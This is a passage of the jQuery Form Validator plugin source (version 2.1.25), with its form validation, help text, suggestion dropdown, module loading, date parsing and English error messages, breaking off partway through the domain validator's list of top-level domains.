/**
* jQuery Form Validator
* ------------------------------------------
* Created by Victor Jonsson <http://www.victorjonsson.se>
*
* @website http://formvalidator.net/
* @license Dual licensed under the MIT or GPL Version 2 licenses
* @version 2.1.25
*/
(function($) {

    'use strict';

    /**
    * Assigns validateInputOnBlur function to elements blur event
    *
    * @param {Object} language Optional, will override $.formUtils.LANG
    * @param {Object} settings Optional, will override the default settings
    * @return {jQuery}
    */
    $.fn.validateOnBlur = function(language, settings) {
        this.find('input[data-validation], textarea[data-validation]')
            .blur(function() {
               $(this).validateInputOnBlur(language, settings);
            });
        return this;
    };

    /**
    * fade in help message when input gains focus
    * fade out when input loses focus
    * <input data-help="The info that I want to display for the user when input is focused" ... />
    *
    * @param {String} attrName - Optional, default is data-help
    * @return {jQuery}
    */
    $.fn.showHelpOnFocus = function(attrName) {
        if(!attrName) {
            attrName = 'data-validation-help';
        }

        this.find('textarea,input').each(function() {
            var $element = $(this),
                className = 'jquery_form_help_' + $element.attr('name'),
                help = $element.attr(attrName);
            if(help) {
                $element
                    .focus(function() {
                        var $help = $element.parent().find('.'+className);
                        if($help.length == 0) {
                            $help = $('<span />')
                                        .addClass(className)
                                        .addClass('help-block') // twitter bs
                                        .text(help)
                                        .hide();

                            $element.after($help);

                        }
                        $help.fadeIn();
                    })
                    .blur(function() {
                        $(this)
                            .parent()
                            .find('.'+className)
                                .fadeOut('slow');
                    });
            }
        });

        return this;
    };

    /**
    * Validate single input when it loses focus
    * shows error message in a span element 
    * that is appended to the parent element
    *
    * @param {Object} [language] Optional, will override $.formUtils.LANG
    * @param {Object} [config] Optional, will override the default settings
    * @param {Boolean} [attachKeyupEvent] Optional
    * @param {String} [eventContext]
    * @return {jQuery}
    */
    $.fn.validateInputOnBlur = function(language, config, attachKeyupEvent, eventContext) {
        if(attachKeyupEvent === undefined)
            attachKeyupEvent = true;
        if(!eventContext)
            eventContext = 'blur';

        language = $.extend($.formUtils.LANG, language || {});
        config = $.extend($.formUtils.defaultConfig(), config || {});
        config.errorMessagePosition = 'element';

        var $element = this,

            // test if there is custom obj to hold element error msg (id = element name + err_msg)
            elementErrMsgObj = document.getElementById($element.attr('name')+'_err_msg'),

            $form = $element.closest("form"),

            validationRule = $element.attr(config.validationRuleAttribute);

        // Remove possible error style applied by previous validation
        $element
            .removeClass(config.errorElementClass)
            .css('border-color', '')
            .parent()
                .find('.'+config.errorMessageClass).remove();

        // Twitter bs
        $form.find('.has-error').removeClass('has-error');
        $element.removeClass('valid').parent().removeClass('has-success');

        // if element has custom err msg container, clear it
        if( elementErrMsgObj != null) {
            elementErrMsgObj.innerHTML = '';
        }

        var validation = $.formUtils.validateInput($element, language, config, $form, eventContext);

        if(validation === true) {
            $element
                .addClass('valid')
                .parent()
                    .addClass('has-success'); // twitter bs
        } else if(validation === null) {
            $element
                .removeClass('valid')
                .parent()
                    .removeClass('has-error')
                    .removeClass('has-success');
        } else {
            $element
                .addClass(config.errorElementClass)
                .removeClass('valid')
                .parent()
                    .addClass('has-error')
                    .removeClass('has-success'); // twitter bs

            // if element has custom err msg container, use it
            if( elementErrMsgObj != null) {
                elementErrMsgObj.innerHTML = validation;
            } else { // use regular span append
                var $parent = $element.parent();
                $parent.append('<span class="'+config.errorMessageClass+' help-block">'+validation+'</span>');
                $parent.addClass('has-error'); // twitter bs
            }

            if(config.borderColorOnError !== '') {
                $element.css('border-color', config.borderColorOnError);
            }

            if(attachKeyupEvent) {
                $element.bind('keyup', function() {
                    $(this).validateInputOnBlur(language, config, false, 'keyup');
                });
            }
        }

        return this;
    };

    /**
     * Short hand for fetching/adding/removing element attributes
     * prefixed with 'data-validation-'
     *
     * @param {String} name
     * @param {String|Boolean} [val]
     * @return string|undefined
     * @protected
     */
    $.fn.valAttr = function(name, val) {
        if( val === undefined ) {
            return this.attr('data-validation-'+name);
        } else if( val === false || val === null ) {
            return this.removeAttr('data-validation-'+name);
        } else {
            if(name.length > 0) name='-'+name;
            return this.attr('data-validation'+name, val);
        }
    };

    /**
     * Function that validate all inputs in a form
     *
     * @param [language]
     * @param [config]
     */
    $.fn.validateForm = function(language, config) {

        language = $.extend($.formUtils.LANG, language || {});
        config = $.extend($.formUtils.defaultConfig(), config || {});

        $.formUtils.isValidatingEntireForm = true;
        $.formUtils.haltValidation = false;

        /**
         * Adds message to error message stack if not already in the message stack
         *
         * @param {String} mess
         * @para {jQuery} $element
         */
        var addErrorMessage = function(mess, $element) {
            // validate server side will return null as error message before the server is requested
            if(mess !== null) {
                if ($.inArray(mess, errorMessages) < 0) {
                    errorMessages.push(mess);
                }
                errorInputs.push($element);
                $element
                    .valAttr('current-error', mess)
                    .removeClass('valid')
                    .parent()
                    .removeClass('has-success');
            }
        },

        /** Error messages for this validation */
        errorMessages = [],

        /** Input elements which value was not valid */
        errorInputs = [],

        /** Form instance */
        $form = this,

        /**
         * Tells whether or not to validate element with this name and of this type
         *
         * @param {String} name
         * @param {String} type
         * @return {Boolean}
         */
        ignoreInput = function(name, type) {
            if (type === 'submit' || type === 'button') {
                return true;
            }
            return $.inArray(name, config.ignore || []) > -1;
        };

        //
        // Validate element values
        //
        $form.find('input,textarea,select').filter(':not([type="submit"],[type="button"])').each(function() {
            var $element = $(this);
            var elementType = $element.attr('type');
            if (!ignoreInput($element.attr('name'), elementType)) {

                var validation = $.formUtils.validateInput(
                                $element,
                                language,
                                config,
                                $form,
                                'submit'
                            );

                if(validation !== true) {
                    addErrorMessage(validation, $element);
                } else {
                    $element
                        .valAttr('current-error', false)
                        .addClass('valid')
                        .parent()
                            .addClass('has-success');
                }
            }

        });

        //
        // Reset style and remove error class
        //
        $form.find('.has-error').removeClass('has-error');
        $form.find('input,textarea,select')
            .css('border-color', '')
            .removeClass(config.errorElementClass);

        //
        // Remove possible error messages from last validation
        //
        $('.' + $.split(config.errorMessageClass, ' ').join('.')).remove();
        $('.'+config.errorMessageClass).remove();

        //
        // Run validation callback
        //
        if( typeof config.onValidate == 'function' ) {
            var resp = config.onValidate($form);
            if( resp && resp.element && resp.message ) {
                addErrorMessage(resp.message, resp.element);
            }
        }

        //
        // Validation failed
        //
        if (!$.formUtils.haltValidation && errorInputs.length > 0) {

            // Reset form validation flag
            $.formUtils.isValidatingEntireForm = false;

            // Apply error style to invalid inputs
            $.each(errorInputs, function(i, $input) {
                if (config.borderColorOnError !== '') {
                    $input.css('border-color', config.borderColorOnError);
                }
                $input
                    .addClass(config.errorElementClass)
                    .parent()
                        .addClass('has-error');
            });

            // display all error messages in top of form
            if (config.errorMessagePosition === 'top') {
                var messages = '<strong>' + language.errorTitle + '</strong>';
                $.each(errorMessages, function(i, mess) {
                    messages += '<br />* ' + mess;
                });

                // using div instead of P gives better control of css display properties
                $form.children().eq(0).before('<div class="' + config.errorMessageClass + ' alert alert-danger">' + messages + '</div>');
                if(config.scrollToTopOnError) {
                    $(window).scrollTop($form.offset().top - 20);
                }
            }

            // Display error message below input field
            else {
                $.each(errorInputs, function(i, $input) {
                    var $parent = $input.parent(),
                        $errorSpan = $parent.find('span[class='+config.errorMessageClass+']');
                    if ($errorSpan.length > 0) {
                        $errorSpan.text(', '+$input.valAttr('current-error'));
                    } else {
                        $parent.append('<span class="'+config.errorMessageClass+' help-block">' + $input.valAttr('current-error') + '</span>');
                    }
                });
            }
            return false;
        }

        // Reset form validation flag
        $.formUtils.isValidatingEntireForm = false;

        return !$.formUtils.haltValidation;
    };

    /**
    * Plugin for displaying input length restriction
    */
    $.fn.restrictLength = function(maxLengthElement) {
        new $.formUtils.lengthRestriction(this, maxLengthElement);
        return this;
    };

    /**
     * Add suggestion dropdown to inputs having data-suggestions with a comma
     * separated string with suggestions
     * @param {Array} [settings]
     * @returns {jQuery}
     */
    $.fn.addSuggestions = function(settings) {
        var sugs = false;
        this.find('input').each(function() {
            var $field = $(this);

            sugs = $.split($field.attr('data-suggestions'));

            if( sugs.length > 0 ) {
                $.formUtils.suggest($field, sugs, settings);
            }
        });
        return this;
    };

    /**
     * A bit smarter split function
     * @param {String} val
     * @param {Function|String} [func]
     * @param {String} [delim]
     * @returns {Array|void}
     */
    $.split = function(val, func, delim) {
        if( typeof func != 'function' ) {
            // return string
            if( !val )
                return [];
            var values = [];
            $.each(val.split(func ? func:','), function(i,str) {
                str = $.trim(str);
                if( str.length )
                    values.push(str);
            });
            return values;
        } else if( val ) {
            // use callback on each
            if( !delim )
                delim = ',';
            $.each(val.split(delim), function(i, str) {
                str = $.trim(str);
                if( str.length )
                    return func(str, i);
            });
        }
    };

    /**
     * Short hand function that makes the validation setup require less code
     * @param config
     */
    $.validate = function(config) {
        config = $.extend({
            form : 'form',
            validateOnBlur : true,
            showHelpOnFocus : true,
            addSuggestions : true,
            modules : '',
            onModulesLoaded : null,
            language : false,
            onSuccess : false,
            onError : false
        }, config || {});

        $.split(config.form, function(formQuery) {
            var $form  = $(formQuery);

            // Validate when submitted
            $form.bind('submit', function() {
                if($.formUtils.isLoadingModules) {
                    setTimeout(function() {
                        $form.trigger('submit');
                    }, 200);
                    return false;
                }
                var valid = $(this).validateForm(config.language, config);
                if( valid && typeof config.onSuccess == 'function') {
                    var callbackResponse = config.onSuccess($form);
                    if( callbackResponse === false )
                        return false;
                } else if ( !valid && typeof config.onError == 'function' ) {
                    config.onError($form);
                    return false;
                } else {
                    return valid;
                }
            });

            if( config.validateOnBlur ) {
                $form.validateOnBlur(config.language, config);
            }
            if( config.showHelpOnFocus ) {
                $form.showHelpOnFocus();
            }
            if( config.addSuggestions ) {
                $form.addSuggestions();
            }
        });

        if( config.modules != '' ) {
            if( typeof config.onModulesLoaded == 'function' ) {
                $.formUtils.on('load', function() {
                    config.onModulesLoaded();
                });
            }
            $.formUtils.loadModules(config.modules);
        }
    };

    /**
     * @deprecated
     * @param {Object} config
     */
    $.validationSetup = function(config) {
        if( typeof console != 'undefined' && console.warn ) {
            window.console.warn('Using deprecated function $.validationSetup, pls use $.validate instead');
        }
        $.validate(config);
    };

    /**
     * Object containing utility methods for this plugin
     */
    $.formUtils = {

        /**
         * Default config for $(...).validateForm();
         */
        defaultConfig :  function() {
            return {
                ignore : [], // Names of inputs not to be validated even though node attribute containing the validation rules tells us to
                errorElementClass : 'error', // Class that will be put on elements which value is invalid
                borderColorOnError : 'red', // Border color of elements which value is invalid, empty string to not change border color
                errorMessageClass : 'form-error', // class name of div containing error messages when validation fails
                validationRuleAttribute : 'data-validation', // name of the attribute holding the validation rules
                validationErrorMsgAttribute : 'data-validation-error-msg', // define custom err msg inline with element
                errorMessagePosition : 'element', // Can be either "top" or "element"
                scrollToTopOnError : true,
                dateFormat : 'yyyy-mm-dd',
                addValidClassOnAll : false, // whether or not to apply class="valid" even if the input wasn't validated
                decimalSeparator : '.'
            }
        },

        /**
        * Available validators
        */
        validators : {},

        /**
         * Events triggered by form validator
         */
        _events : {load : [], valid: [], invalid:[]},

        /**
         * Setting this property to true during validation will
         * stop further validation from taking place and form will
         * not be sent
         */
        haltValidation : false,

        /**
         * This variable will be true $.fn.validateForm() is called
         * and false when $.fn.validateOnBlur is called
         */
        isValidatingEntireForm : false,

        /**
        * Function for adding a validator
        * @param {Object} validator
        */
        addValidator : function(validator) {
            // prefix with "validate_" for backward compatibility reasons
            var name = validator.name.indexOf('validate_') === 0 ? validator.name : 'validate_'+validator.name;
            if( validator.validateOnKeyUp === undefined )
                validator.validateOnKeyUp = true;
            this.validators[name] = validator;
        },

        /**
         * @param {String} evt
         * @param {Function} callback
         */
        on : function(evt, callback) {
            // Why not use $(document).bind('validators.loaded', func);
            if( this._events[evt] === undefined )
                this._events[evt] = [];
            this._events[evt].push(callback);
        },

        /**
         * @param {String} evt
         * @param [argA]
         * @param [argB]
         */
        trigger : function(evt, argA, argB) {
            $.each(this._events[evt] || [], function(i, func) {
                func(argA, argB);
            });
        },

        /**
         * @ {Boolean}
         */
        isLoadingModules : false,

        /**
        * @example
        *  $.formUtils.loadModules('date, security.dev');
        *
        * Will load the scripts date.js and security.dev.js from the
        * directory where this script resides. If you want to load
        * the modules from another directory you can use the
        * path argument.
        *
        * The script will be cached by the browser unless the module
        * name ends with .dev
        *
        * @param {String} modules - Comma separated string with module file names (no directory nor file extension)
        * @param {String} [path] - Optional, path where the module files is located if their not in the same directory as the core modules
        * @param {Boolean} [fireEvent] - Optional, whether or not to fire event 'load' when modules finished loading
        */
        loadModules : function(modules, path, fireEvent) {

            if( fireEvent === undefined )
                fireEvent = true;

            if( $.formUtils.isLoadingModules ) {
                setTimeout(function() {
                    $.formUtils.loadModules(modules, path, fireEvent);
                });
                return;
            }

            var loadModuleScripts = function(modules, path) {
                var moduleList = $.split(modules),
                    numModules = moduleList.length,
                    moduleLoadedCallback = function() {
                        numModules--;
                        if( numModules == 0 ) {
                            $.formUtils.isLoadingModules = false;
                            if( fireEvent ) {
                                $.formUtils.trigger('load', path);
                            }
                        }
                    };

                if( numModules > 0 ) {
                    $.formUtils.isLoadingModules = true;
                }

                var cacheSuffix = '?__='+( new Date().getTime() ),
                    appendToElement = document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0];

                $.each(moduleList, function(i, modName) {
                    modName = $.trim(modName);
                    if( modName.length == 0 ) {
                        moduleLoadedCallback();
                    }
                    else {
                        var scriptUrl = path + modName + (modName.substr(-3) == '.js' ? '':'.js'),
                            script = document.createElement('SCRIPT');
                        script.type = 'text/javascript';
                        script.onload = moduleLoadedCallback;
                        script.src = scriptUrl + ( scriptUrl.substr(-7) == '.dev.js' ? cacheSuffix:'' );
                        script.onreadystatechange = function() {
                            // IE 7 fix
                            if( this.readyState == 'complete' ) {
                                moduleLoadedCallback();
                            }
                        };
                        appendToElement.appendChild( script );
                    }
                });
            };

            if( path ) {
                loadModuleScripts(modules, path);
            } else {
                var findScriptPathAndLoadModules = function() {
                    var foundPath = false;
                    $('script').each(function() {
                        if( this.src ) {
                            var scriptName = this.src.substr(this.src.lastIndexOf('/')+1, this.src.length);
                            if(scriptName.indexOf('jquery.form-validator.js') > -1 || scriptName.indexOf('jquery.form-validator.min.js') > -1) {
                                foundPath = this.src.substr(0, this.src.lastIndexOf('/')) + '/';
                                if( foundPath == '/' )
                                    foundPath = '';
                                return false;
                            }
                        }
                    });

                    if( foundPath !== false) {
                        loadModuleScripts(modules, foundPath);
                        return true;
                    }
                    return false;
                };

                if( !findScriptPathAndLoadModules() ) {
                    $(findScriptPathAndLoadModules);
                }
            }
        },

        /**
        * Validate the value of given element according to the validation rules
        * found in the attribute data-validation. Will return true if valid,
        * error message otherwise
        *
        * @param {jQuery} $element
        * @param {Object} language ($.formUtils.LANG)
        * @param {Object} config
        * @param {jQuery} $form
        * @param {String} [eventContext]
        * @return {String|Boolean}
        */
        validateInput : function($element, language, config, $form, eventContext) {

            var value = $.trim( $element.val() || ''),
                optional = $element.valAttr('optional'),

                // test if a checkbox forces this element to be validated
                validationDependsOnCheckedInput = false,
                validationDependentInputIsChecked = false,
                validateIfCheckedElement = false,

                // get value of this element's attribute "... if-checked"
                validateIfCheckedElementName = $element.valAttr("if-checked");

            // make sure we can proceed
            if (validateIfCheckedElementName != null) {

                // Set the boolean telling us that the validation depends
                // on another input being checked
                validationDependsOnCheckedInput = true;

                // select the checkbox type element in this form
                validateIfCheckedElement = $form.find('input[name="' + validateIfCheckedElementName + '"]');

                // test if it's property "checked" is checked
                if ( validateIfCheckedElement.prop('checked') ) {
                    // set value for validation checkpoint
                    validationDependentInputIsChecked = true;
                }
            }

            // validation checkpoint
            // if empty AND optional attribute is present
            // OR depending on a checkbox being checked AND checkbox is checked, return true
            if ((!value && optional === 'true') || (validationDependsOnCheckedInput && !validationDependentInputIsChecked)) {
                return config.addValidClassOnAll ? true:null;
            }

            var validationRules = $element.attr(config.validationRuleAttribute),

                // see if form element has inline err msg attribute
                validationErrorMsg = true;

            if( !validationRules ) {
                return config.addValidClassOnAll ? true:null;
            }

            $.split(validationRules, function(rule) {
                if( rule.indexOf('validate_') !== 0 ) {
                    rule = 'validate_' + rule;
                }

                var validator = $.formUtils.validators[rule];

                if( validator && typeof validator['validatorFunction'] == 'function' ) {
                    // special change of element for checkbox_group rule
                    if ( rule == 'validate_checkbox_group' ) {
                        // set element to first in group, so error msg is set only once
                            $element = $("[name='"+$element.attr('name')+"']:eq(0)");
                    }

                    var isValid = true;
                    if( eventContext != 'keyup' || validator.validateOnKeyUp ) {
                        isValid = validator.validatorFunction(value, $element, config, language, $form);
                    }

                    if(!isValid) {
                        validationErrorMsg =  $element.attr(config.validationErrorMsgAttribute);
                        if( !validationErrorMsg ) {
                            validationErrorMsg = language[validator.errorMessageKey];
                            if( !validationErrorMsg )
                                validationErrorMsg = validator.errorMessage;
                        }
                        return false; // breaks the iteration
                    }

                } else {
                    console.warn('Using undefined validator "'+rule+'"');
                }

            }, ' ');

            if( typeof validationErrorMsg == 'string' ) {
                return validationErrorMsg;
            } else {
                return true;
            }
        },

       /**
        * Is it a correct date according to given dateFormat. Will return false if not, otherwise
        * an array 0=>year 1=>month 2=>day
        *
        * @param {String} val
        * @param {String} dateFormat
        * @return {Array}|{Boolean}
        */
        parseDate : function(val, dateFormat) {
            var divider = dateFormat.replace(/[a-zA-Z]/gi, '').substring(0,1),
                regexp = '^',
                formatParts = dateFormat.split(divider),
                matches, day, month, year;

            $.each(formatParts, function(i, part) {
               regexp += (i > 0 ? '\\'+divider:'') + '(\\d{'+part.length+'})';
            });

            regexp += '$';
            
            matches = val.match(new RegExp(regexp));
            if (matches === null) {
                return false;
            }
        
            var findDateUnit = function(unit, formatParts, matches) {
                for(var i=0; i < formatParts.length; i++) {
                    if(formatParts[i].substring(0,1) === unit) {
                        return $.formUtils.parseDateInt(matches[i+1]);
                    }
                }
                return -1;
            };
        
            month = findDateUnit('m', formatParts, matches);
            day = findDateUnit('d', formatParts, matches);
            year = findDateUnit('y', formatParts, matches);
        
            if ((month === 2 && day > 28 && (year % 4 !== 0  || year % 100 === 0 && year % 400 !== 0)) 
            	|| (month === 2 && day > 29 && (year % 4 === 0 || year % 100 !== 0 && year % 400 === 0))
            	|| month > 12 || month === 0) {
                return false;
            }
            if ((this.isShortMonth(month) && day > 30) || (!this.isShortMonth(month) && day > 31) || day === 0) {
                return false;
            }
        
            return [year, month, day];
        },

       /**
        * skum fix. är talet 05 eller lägre ger parseInt rätt int annars får man 0 när man kör parseInt?
        *
        * @param {String} val
        * @param {Number}
        */
        parseDateInt : function(val) {
            if (val.indexOf('0') === 0) {
                val = val.replace('0', '');
            }
            return parseInt(val,10);
        },

        /**
        * Has month only 30 days?
        *
        * @param {Number} m
        * @return {Boolean}
        */
        isShortMonth : function(m) {
            return (m % 2 === 0 && m < 7) || (m % 2 !== 0 && m > 7);
        },

       /**
        * Restrict input length
        *
        * @param {jQuery} $inputElement Jquery Html object
        * @param {jQuery} $maxLengthElement jQuery Html Object
        * @return void
        */
        lengthRestriction : function($inputElement, $maxLengthElement) {
                // read maxChars from counter display initial text value
           var maxChars = parseInt($maxLengthElement.text(),10),

               // internal function does the counting and sets display value
               countCharacters = function() {
                   var numChars = $inputElement.val().length;
                   if(numChars > maxChars) {
                       // get current scroll bar position
                       var currScrollTopPos = $inputElement.scrollTop();
                       // trim value to max length
                       $inputElement.val($inputElement.val().substring(0, maxChars));
                       $inputElement.scrollTop(currScrollTopPos);
                   }
                   // set counter text
                   $maxLengthElement.text(maxChars - numChars);
               };

           // bind events to this element
           // setTimeout is needed, cut or paste fires before val is available
           $($inputElement).bind('keydown keyup keypress focus blur',  countCharacters )
               .bind('cut paste', function(){ setTimeout(countCharacters, 100); } ) ;

           // count chars on pageload, if there are prefilled input-values
           $(document).bind("ready", countCharacters);
        },

        /**
        * Test numeric against allowed range
        *
        * @param $value int
        * @param $rangeAllowed str; (1-2, min1, max2)
        * @return array 
        */
        numericRangeCheck : function(value, rangeAllowed) 
        {
           // split by dash
           var range = $.split(rangeAllowed, '-');
           // min or max
           var minmax = parseInt(rangeAllowed.substr(3),10)
           // range ?
           if (range.length == 2 && (value < parseInt(range[0],10) || value > parseInt(range[1],10) ) )
           {   return [ "out", range[0], range[1] ] ; } // value is out of range
           else if (rangeAllowed.indexOf('min') === 0 && (value < minmax ) ) // min
                {  return ["min", minmax]; } // value is below min
                else if (rangeAllowed.indexOf('max') === 0 && (value > minmax ) ) // max
                     {   return ["max", minmax]; } // value is above max
           else { return [ "ok" ] ; } // value is in allowed range
        },


        _numSuggestionElements : 0,
        _selectedSuggestion : null,
        _previousTypedVal : null,

        /**
         * Utility function that can be used to create plugins that gives
         * suggestions when inputs is typed into
         * @param {jQuery} $element
         * @param {Array} suggestions
         * @param {Object} settings - Optional
         * @return {jQuery}
         */
        suggest : function($element, suggestions, settings) {
            var config =  {
                css : {
                    maxHeight: '150px',
                    background: '#FFF',
                    lineHeight:'150%',
                    textDecoration : 'underline',
                    overflowX : 'hidden',
                    overflowY : 'auto',
                    border : '#CCC solid 1px',
                    borderTop : 'none',
                    cursor: 'pointer'
                },
                activeSuggestionCSS : {
                    background : '#E9E9E9'
                }
            };

            if(settings)
                $.extend(config, settings);

            config.css['position'] = 'absolute';
            config.css['z-index'] = 9999;
            $element.attr('autocomplete', 'off');

            this._numSuggestionElements++;

            var onSelectSuggestion = function($el) {
                var suggestionId = $el.valAttr('suggestion-nr');
                $.formUtils._selectedSuggestion = null;
                $.formUtils._previousTypedVal = null;
                $('.jquery-form-suggestion-'+suggestionId).fadeOut('fast');
            };

            $element
                .data('suggestions', suggestions)
                .valAttr('suggestion-nr', this._numSuggestionElements)
                .bind('focus', function() {
                    $(this).trigger('keyup');
                    $.formUtils._selectedSuggestion = null;
                })
                .bind('keyup', function() {
                    var $input = $(this),
                        foundSuggestions = [],
                        val = $.trim($input.val()).toLocaleLowerCase();

                    if(val == $.formUtils._previousTypedVal) {
                        return;
                    }
                    else {
                        $.formUtils._previousTypedVal = val;
                    }

                    var hasTypedSuggestion = false,
                        suggestionId = $input.valAttr('suggestion-nr'),
                        $suggestionContainer = $('.jquery-form-suggestion-'+suggestionId);

                    $suggestionContainer.scrollTop(0);

                    // Find the right suggestions
                    if(val != '') {
                        var findPartial = val.length > 2;
                        $.each($input.data('suggestions'), function(i, suggestion) {
                            var lowerCaseVal = suggestion.toLocaleLowerCase();
                            if( lowerCaseVal == val ) {
                                foundSuggestions.push('<strong>'+suggestion+'</strong>');
                                hasTypedSuggestion = true;
                                return false;
                            } else if(lowerCaseVal.indexOf(val) === 0 || (findPartial && lowerCaseVal.indexOf(val) > -1)) {
                                foundSuggestions.push(suggestion.replace(new RegExp(val, 'gi'), '<strong>$&</strong>'));
                            }
                        });
                    }

                    // Hide suggestion container
                    if(hasTypedSuggestion || (foundSuggestions.length == 0 && $suggestionContainer.length > 0)) {
                        $suggestionContainer.hide();
                    }

                    // Create suggestion container if not already exists
                    else if(foundSuggestions.length > 0 && $suggestionContainer.length == 0) {
                        $suggestionContainer = $('<div></div>').css(config.css).appendTo('body');
                        $suggestionContainer.addClass('jquery-form-suggestions');
                        $suggestionContainer.addClass('jquery-form-suggestion-'+suggestionId);
                    }

                    // Show hidden container
                    else if(foundSuggestions.length > 0 && !$suggestionContainer.is(':visible')) {
                        $suggestionContainer.show();
                    }

                    // add suggestions
                    if(foundSuggestions.length > 0 && val.length != foundSuggestions[0].length) {

                        // put container in place every time, just in case
                        var offset = $input.offset();
                        $suggestionContainer.css({
                            width : $input.outerWidth(),
                            left : offset.left + 'px',
                            top : (offset.top + $input.outerHeight()) +'px'
                        });

                        // Add suggestions HTML to container
                        $suggestionContainer.html('');
                        $.each(foundSuggestions, function(i, text) {
                            $('<div></div>')
                                .append(text)
                                .css({
                                    overflow: 'hidden',
                                    textOverflow : 'ellipsis',
                                    whiteSpace : 'nowrap',
                                    padding: '5px'
                                })
                                .addClass('form-suggest-element')
                                .appendTo($suggestionContainer)
                                .click(function() {
                                    $input.focus();
                                    $input.val( $(this).text() );
                                    onSelectSuggestion($input);
                                });
                        });
                    }
                })
                .bind('keydown', function(e) {
                    var code = (e.keyCode ? e.keyCode : e.which),
                        suggestionId,
                        $suggestionContainer,
                        $input = $(this);

                    if(code == 13 && $.formUtils._selectedSuggestion !== null) {
                        suggestionId = $input.valAttr('suggestion-nr');
                        $suggestionContainer = $('.jquery-form-suggestion-'+suggestionId);
                        if($suggestionContainer.length > 0) {
                            var newText = $suggestionContainer.find('div').eq($.formUtils._selectedSuggestion).text();
                            $input.val(newText);
                            onSelectSuggestion($input);
                            e.preventDefault();
                        }
                    }
                    else {
                        suggestionId = $input.valAttr('suggestion-nr');
                        $suggestionContainer = $('.jquery-form-suggestion-'+suggestionId);
                        var $suggestions = $suggestionContainer.children();
                        if($suggestions.length > 0 && $.inArray(code, [38,40]) > -1) {
                            if(code == 38) { // key up
                                if($.formUtils._selectedSuggestion === null)
                                    $.formUtils._selectedSuggestion = $suggestions.length-1;
                                else
                                    $.formUtils._selectedSuggestion--;
                                if($.formUtils._selectedSuggestion < 0)
                                    $.formUtils._selectedSuggestion = $suggestions.length-1;
                            }
                            else if(code == 40) { // key down
                                if($.formUtils._selectedSuggestion === null)
                                    $.formUtils._selectedSuggestion = 0;
                                else
                                    $.formUtils._selectedSuggestion++;
                                if($.formUtils._selectedSuggestion > ($suggestions.length-1))
                                    $.formUtils._selectedSuggestion = 0;

                            }

                            // Scroll in suggestion window
                            var containerInnerHeight = $suggestionContainer.innerHeight(),
                                containerScrollTop = $suggestionContainer.scrollTop(),
                                suggestionHeight = $suggestionContainer.children().eq(0).outerHeight(),
                                activeSuggestionPosY = suggestionHeight * ($.formUtils._selectedSuggestion);

                            if( activeSuggestionPosY < containerScrollTop || activeSuggestionPosY > (containerScrollTop+containerInnerHeight)) {
                                $suggestionContainer.scrollTop( activeSuggestionPosY );
                            }

                            $suggestions
                                .removeClass('active-suggestion')
                                .css('background', 'none')
                                .eq($.formUtils._selectedSuggestion)
                                    .addClass('active-suggestion')
                                    .css(config.activeSuggestionCSS);

                            e.preventDefault();
                            return false;
                        }
                    }
                })
                .bind('blur', function() {
                    onSelectSuggestion($(this));
                });

            return $element;
        },

       /**
        * Error dialogs
        *
        * @var {Object}
        */
        LANG : {
            errorTitle : 'Form submission failed!',
            requiredFields : 'You have not answered all required fields',
            badTime : 'You have not given a correct time',
            badEmail : 'You have not given a correct e-mail address',
            badTelephone : 'You have not given a correct phone number',
            badSecurityAnswer : 'You have not given a correct answer to the security question',
            badDate : 'You have not given a correct date',
            lengthBadStart : 'You must give an answer between ',
            lengthBadEnd : ' characters',
            lengthTooLongStart : 'You have given an answer longer than ',
            lengthTooShortStart : 'You have given an answer shorter than ',
            notConfirmed : 'Values could not be confirmed',
            badDomain : 'Incorrect domain value',
            badUrl : 'The answer you gave was not a correct URL',
            badCustomVal : 'You gave an incorrect answer',
            badInt : 'The answer you gave was not a correct number',
            badSecurityNumber : 'Your social security number was incorrect',
            badUKVatAnswer : 'Incorrect UK VAT Number',
            badStrength : 'The password isn\'t strong enough',
            badNumberOfSelectedOptionsStart : 'You have to choose at least ',
            badNumberOfSelectedOptionsEnd : ' answers',
            badAlphaNumeric : 'The answer you gave must contain only alphanumeric characters ',
            badAlphaNumericExtra: ' and ',
            wrongFileSize : 'The file you are trying to upload is too large',
            wrongFileType : 'The file you are trying to upload is of wrong type',
            groupCheckedRangeStart : 'Please choose between ',
            groupCheckedTooFewStart : 'Please choose at least ',
            groupCheckedTooManyStart : 'Please choose a maximum of ',           
            groupCheckedEnd : ' item(s)'
        }
    };


    /* * * * * * * * * * * * * * * * * * * * * *
      CORE VALIDATORS
    * * * * * * * * * * * * * * * * * * * * */


    /*
    * Validate email
    */
    $.formUtils.addValidator({
        name : 'email',
        validatorFunction : function(email) {

            var emailParts = email.split('@');
            if( emailParts.length == 2 ) {
                return $.formUtils.validators.validate_domain.validatorFunction(emailParts[1]) &&
                        !(/[^a-zA-Z0-9_\+\.\-]/.test(emailParts[0]));
            }

            return false;
        },
        errorMessage : '',
        errorMessageKey : 'badEmail'
    });

    /*
    * Validate domain name
    */
    $.formUtils.addValidator({
        name : 'domain',
        validatorFunction : function(val, $input) {

            var topDomains = ['.eu', '.com', '.net', '.org', '.biz', '.coop', '.info', '.museum', '.name', '.pro',
                    '.edu', '.gov', '.int', '.mil', '.ac', '.ad', '.ae', '.af', '.ag', '.ai', '.al',
                    '.am', '.an', '.ao', '.aq', '.ar', '.as', '.at', '.au', '.aw', '.az', '.ba', '.bb',
                    '.bd', '.be', '.bf', '.bg', '.bh', '.bi', '.bj', '.bm', '.bn', '.bo', '.br', '.bs',
                    '.bt', '.bv', '.bw', '.by', '.bz', '.ca', '.cc', '.cd', '.cf', '.cg', '.ch', '.ci',
                    '.ck', '.cl', '.cm', '.cn', '.co', '.cr', '.cu', '.cv', '.cx', '.cy', '.cz', '.de',
                    '.dj', '.dk', '.dm', '.do', '.dz', '.ec', '.ee', '.eg', '.eh', '.er', '.es', '.et',
                    '.fi', '.fj', '.fk', '.fm', '.fo', '.fr', '.ga', '.gd', '.ge', '.gf', '.gg', '.gh',
                    '.gi', '.gl', '.gm', '.gn', '.gp', '.gq', '.gr', '.gs', '.gt', '.gu', '.gv', '.gy',
                    '.hk', '.hm', '.hn', '.hr', '.ht', '.hu', '.id', '.ie', '.il', '.im', '.in', '.io',
                    '.iq', '.ir', '.is', '.it', '.je', '.jm', '.jo', '.jp', '.ke', '.kg', '.kh', '.ki',
                    '.km', '.kn', '.kp', '.kr', '.kw', '.ky', '.kz', '.la', '.lb', '.lc', '.li', '.lk',
                    '.lr', '.ls', '.lt', '.lu', '.lv', '.ly', '.ma', '.mc', '.md', '.me', '.mg', '.mh',
